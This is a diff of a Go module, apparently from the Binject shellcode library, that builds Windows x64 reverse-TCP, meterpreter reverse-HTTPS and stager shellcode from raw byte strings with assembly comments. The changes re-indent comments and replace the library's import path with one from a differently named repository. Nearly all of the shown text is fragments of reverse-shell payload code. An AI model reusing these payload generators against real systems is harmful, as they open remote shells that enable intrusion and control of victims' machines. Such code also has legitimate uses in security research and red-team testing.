@@ -3,7 +3,7 @@ package modules
 import (
 	"strings"
 
-	"github.com/Binject/shellcode/api"
+	"github.com/sanitycheck/binject-shellcode/api"
 )
 
 func init() {
@@ -446,10 +446,10 @@ func iat_reverse_tcp_inline_threaded_win_intel_64(params api.Parameters) ([]byte
 		"\x8b\x0e" + // mov ecx, dword [rsi]        ; set the first param to the handle from our PROCESS_INFORMATION.hProcess
 		"\x48\x83\xEC\x20" + // sub rsp, 0x20
 		"\xFF\xD0" // call rax; WaitForSingleObject( pi.hProcess, INFINITE );
-		//Fix Up rsp
-		//"\x48\x81\xC4\x08\x04\x00\x00"                   // add rsp, 0x408
+	//Fix Up rsp
+	//"\x48\x81\xC4\x08\x04\x00\x00"                   // add rsp, 0x408
 
-		// ADD EXITFUNC HERE THREAD
+	// ADD EXITFUNC HERE THREAD
 	//kernel32 handle in r13
 	//LoadLibraryA in r14
 	//GetProcAddress in r15
@@ -602,7 +602,7 @@ func iat_reverse_tcp_inline_threaded_win_intel_64(params api.Parameters) ([]byte
 		"\x48\x89\xc3" + // mov rbx, rax      ; Store allocated address in ebx
 		"\x48\x89\xc7" // mov rdi, rax      ; Prepare EDI with the new address
 
-		//#mov rcx, 0x1ab
+	//#mov rcx, 0x1ab
 	shellcode1 += "\x48\xc7\xc1"
 	if ps, err := api.PackUint32(uint32(len(shellcode2) - 5)); err == nil {
 		shellcode1 += ps
@@ -1236,7 +1236,7 @@ func meterpreter_reverse_https_threaded_win_intel_64(params api.Parameters) ([]b
 		"\xff\xd5" + // call rbp
 		"\x48\x89\xc3" + // mov rbx, rax      ; Store allocated address in ebx
 		"\x48\x89\xc7" // mov rdi, rax      ; Prepare EDI with the new address
-		// mov rcx, 0x1abE
+	// mov rcx, 0x1abE
 	shellcode1 += "\x48\xc7\xc1"
 	if ps, err := api.PackUint16(uint16(len(shellcode2) - 5)); err == nil {
 		shellcode1 += ps
@@ -1492,7 +1492,7 @@ func reverse_tcp_stager_threaded_win_intel_64(params api.Parameters) ([]byte, er
 		"\x48\x8B\x12" + // mov rdx, [rdx] ; Get the next module
 		"\xe9\x57\xff\xff\xff" // jmp next_mod ; Process this module
 
-		// allocate
+	// allocate
 	shellcode1 += "\x5d" + // pop rbp
 		"\x49\xc7\xc6" // mov r14, size of payload below
 	if ps, err := api.PackUint32(uint32(len(shellcode2) - 5)); err == nil {
@@ -1680,7 +1680,7 @@ func user_shellcode_threaded_win_intel_64(params api.Parameters) ([]byte, error)
 		"\x48\x89\xc3" + // mov rbx, rax      ; Store allocated address in ebx
 		"\x48\x89\xc7" // mov rdi, rax      ; Prepare EDI with the new address
 
-		//#mov rcx, 0x1ab
+	//#mov rcx, 0x1ab
 	shellcode1 += "\x48\xc7\xc1"
 	if ps, err := api.PackUint32(uint32(len(shellcode2) - 5)); err == nil {
 		shellcode1 += ps
